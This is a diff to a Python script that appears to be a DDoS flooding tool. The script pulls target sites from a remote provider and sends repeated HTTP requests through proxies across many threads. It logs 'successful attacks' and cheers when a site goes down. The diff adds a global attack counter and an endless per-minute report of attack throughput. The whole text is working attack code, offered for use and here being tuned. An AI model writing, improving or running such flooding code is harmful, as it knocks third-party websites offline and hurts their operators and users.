@@ -3,7 +3,7 @@ import os
 import platform
 
 from argparse import ArgumentParser
-from concurrent.futures import ThreadPoolExecutor, as_completed
+from concurrent.futures import ThreadPoolExecutor
 from gc import collect
 from os import system
 from sys import stderr
@@ -43,6 +43,9 @@ threads = int(args.threads)
 executor_init = ThreadPoolExecutor(max_workers=threads)
 executor_main = ThreadPoolExecutor(max_workers=threads)
 
+last_observed_total_attacks_count = 0
+total_attacks_count = 0
+
 logger.remove()
 logger.add(
     args.logger_output,
@@ -74,7 +77,7 @@ def mainth(site: str):
 
     logger.info("STARTING ATTACK ON " + site)
 
-    attacks_number = 0
+    count_attacks_for_current_site = 0
 
     try:
         attack = scraper.get(site, timeout=settings.READ_TIMEOUT)
@@ -87,28 +90,30 @@ def mainth(site: str):
                     {'http': f'{proxy["ip"]}://{proxy["auth"]}', 'https': f'{proxy["ip"]}://{proxy["auth"]}'})
                 response = scraper.get(site, timeout=10)
                 if 200 <= response.status_code <= 302:
-                    while (attacks_number < settings.MAX_REQUESTS_TO_SITE):
+                    while (count_attacks_for_current_site < settings.MAX_REQUESTS_TO_SITE):
                         response = scraper.get(site, timeout=10)
                         if response.status_code >= 400:
                             break
-                        attacks_number += 1
-                        logger.info(f"Successful attack of {site}; attack count: {attacks_number}; code: {response.status_code}")
+                        count_attacks_for_current_site += 1
+                        total_attacks_count += 1
+                        logger.info(f"Successful attack of {site}; attack count: {count_attacks_for_current_site}; code: {response.status_code}")
         else:
-            while (attacks_number < settings.MAX_REQUESTS_TO_SITE):
+            while (count_attacks_for_current_site < settings.MAX_REQUESTS_TO_SITE):
                 response = scraper.get(site, timeout=10)
                 if response.status_code >= 400:
                     break
-                attacks_number += 1
-                logger.info(f"ATTACKED {site}; attack count: {attacks_number}; RESPONSE CODE: {response.status_code}")
-        if attacks_number > 0:
-            logger.success("SUCCESSFUL ATTACKS on " + site + ": " + str(attacks_number))
+                count_attacks_for_current_site += 1
+                total_attacks_count += 1
+                logger.info(f"ATTACKED {site}; attack count: {count_attacks_for_current_site}; RESPONSE CODE: {response.status_code}")
+        if count_attacks_for_current_site > 0:
+            logger.success("SUCCESSFUL ATTACKS on " + site + ": " + str(count_attacks_for_current_site))
         executor_main.submit(mainth, choice(remoteProvider.get_target_sites()))
     except ConnectionError as exc:
         logger.success(f"{site} is down! =^_^=")
         # when thread is about to finish, just re-start its task
         executor_main.submit(mainth, choice(remoteProvider.get_target_sites()))
     except Exception as exc:
-        logger.warning(f"Error: {exc}; number of successful attacks: {attacks_number}")
+        logger.warning(f"Error: {exc}; number of successful attacks: {count_attacks_for_current_site}")
         executor_main.submit(mainth, choice(remoteProvider.get_target_sites()))
 
 def clear():
@@ -136,4 +141,10 @@ if __name__ == '__main__':
     # initially start as many tasks as configured threads
     for _ in range(threads):
         executor_init.submit(mainth, choice(remoteProvider.get_target_sites()))
-    executor_init.shutdown(wait=True)
+    while True:
+        sleep(60)
+        current_attacks_count = total_attacks_count
+        delta_attacks_count = current_attacks_count - last_observed_total_attacks_count
+        logger.info(f"Performed a total of {delta_attacks_count} attacks in a minute")
+        last_observed_total_attacks_count = current_attacks_count
+
